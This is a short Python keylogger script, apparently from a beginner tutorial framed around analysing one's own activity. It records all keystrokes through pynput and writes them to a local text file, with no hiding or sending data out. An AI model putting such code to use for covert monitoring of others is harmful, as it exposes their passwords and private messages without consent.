# https://dev.to/mustafaanaskh99/for-beginners-analyse-your-own-daily-activity-by-building-a-python-keylogger-44kc

from pynput.keyboard import Key, Listener  # pip install pynput

keys = []
count = 0  # keeping track of how many items are in the keys array at a time


def on_press(e):
    global keys, count  # accessing the global keys array
    keys.append(e)  # add the pressed key to the array
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []  # empty the array after writing


def write_file(keys):
    with open("keylog.txt", "a+") as f:  # the a+ tells python to create log.txt if it does not exist
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
